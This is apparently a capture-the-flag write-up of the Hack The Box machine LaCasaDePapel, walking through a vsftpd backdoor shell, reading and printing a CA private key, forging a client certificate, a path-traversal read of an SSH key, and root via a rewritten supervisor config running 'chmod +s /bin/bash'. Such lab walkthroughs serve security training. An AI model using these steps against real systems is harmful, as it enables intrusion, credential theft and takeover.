---
layout: post
category: writeup
---

## Machine Info

- Name: LaCasaDePapel
- Description: LaCasaDePapel is an easy difficulty Linux box, which is running a backdoored vsftpd server. The backdoored port is running a PHP shell with disabled_functions. This is used to read a CA certificate, from which a client certificate can be created. The HTTPS page is vulnerable to LFI, leading to exposure of SSH keys. A configuration file can be hijacked to gain code execution as root.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT     STATE    SERVICE  VERSION
21/tcp   open     ftp      vsftpd 2.3.4
22/tcp   open     ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp   open     http     Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 621D76BDE56526A10B529BF2BC0776CA
|_http-title: La Casa De Papel
443/tcp  open     ssl/http Node.js Express framework
|_http-title: La Casa De Papel
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Issuer: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T08:35:30
| Not valid after:  2029-01-24T08:35:30
| MD5:   6ea4:933a:a347:ce50:8c40:5f9b:1ea8:8e9a
|_SHA-1: 8c47:7f3e:53d8:e76b:4cdf:ecca:adb6:0551:b1b6:38d4
|_http-favicon: Unknown favicon MD5: 621D76BDE56526A10B529BF2BC0776CA
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

I start with the vulnerable ftp server, this is running vsftpd 2.3.4 which has a backdoor that spawns a shell on port 6200:

![](assets/images/2024-01-22-HTB-LaCasaDePapel-writeup-image-1.png)

However there is a spin to it, it has a php shell here

Based off of the https site, I need a client cert, so I will look for a ca.key here:

```bash
HTB nc 10.10.10.131 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hilemanw
whoami
PHP Warning:  Use of undefined constant whoami - assumed 'whoami' (this will throw an Error in a future version of PHP) in phar://eval()'d code on line 1
scandir('/home');
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
scandir("/home/nairobi");
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
readfile("/home/nairobi/ca.key");
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
=> 1704
```

I was able to find it in nairobi's home dir.

I also read the email that was generated when I entered the info on the http site
this lead me to a page that let me download a ca.crt. with that info i was able to generate a cert and import to my firefox:

```bash
HTB openssl pkcs12 -export -out certificate.pfx -inkey ca.key -in ca.crt -certfile ca.crt
Enter Export Password:
Verifying - Enter Export Password:
```

Import it on firefox:

![](assets/images/2024-01-22-HTB-LaCasaDePapel-writeup-image-2.png)

Now when I load in:

![](assets/images/2024-01-22-HTB-LaCasaDePapel-writeup-image-3.png)

I can click on a season:

![](assets/images/2024-01-22-HTB-LaCasaDePapel-writeup-image-4.png)

I can see the path GET param:

Hovering over the avi files I can see that it is a path:

![](assets/images/2024-01-22-HTB-LaCasaDePapel-writeup-image-5.png)

I encode `../.ssh/id_rsa` and get the ssh key and ssh in as the professor user:
## Privilege Escalation

```bash
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

I can see that the memcached file is running as sudo, I can't change it but I can delete it and  rewrite a new one:
```bash
lacasadepapel [~]$ rm memcached.ini
rm: remove 'memcached.ini'? y
lacasadepapel [~]$ ls
memcached.js  node_modules
```

I will then replace it with a new command:

```bash
[program:memcached]
command = sudo chmod +s /bin/bash
```

after a few minutes I get root!

best,
gerbsec